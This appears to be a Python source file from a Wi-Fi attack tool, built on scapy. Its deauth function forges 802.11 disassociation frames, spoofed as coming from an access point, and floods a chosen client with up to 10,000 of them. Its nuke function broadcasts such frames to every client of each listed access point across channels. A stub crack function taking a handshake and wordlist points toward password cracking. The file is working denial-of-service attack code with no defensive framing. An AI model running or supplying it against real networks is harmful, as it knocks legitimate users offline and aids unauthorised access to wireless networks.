from NetworkController import NetworkController
from scapy.all import *
import time
import subprocess

def deauth(interface, target, access_point, channel, spam, packet_count=10):
    print(target, access_point);
    subprocess.call(['iwconfig', interface, 'chan', str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    packet = RadioTap()/Dot11(type=0, subtype=10, addr1=target, addr2=access_point, addr3=access_point)/Dot11Disas(reason=3)
    
    if spam:
        packet_count = 10000

    for _ in range(packet_count):
        sendp(packet, iface=interface)
        # time.sleep(0.5)

def nuke(interface, access_points, packet_count):

    for _ in range(packet_count):
        for ap in access_points:
            p = subprocess.call(['iwconfig', interface, 'chan', str(access_points[ap].channel)])#, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            packet = RadioTap()/Dot11(type=0, subtype=10, addr1="FF:FF:FF:FF:FF:FF", addr2=ap, addr3=ap)/Dot11Disas(reason=3)
            sendp(packet, iface=interface)

def crack(handshake, wordlist):
    pass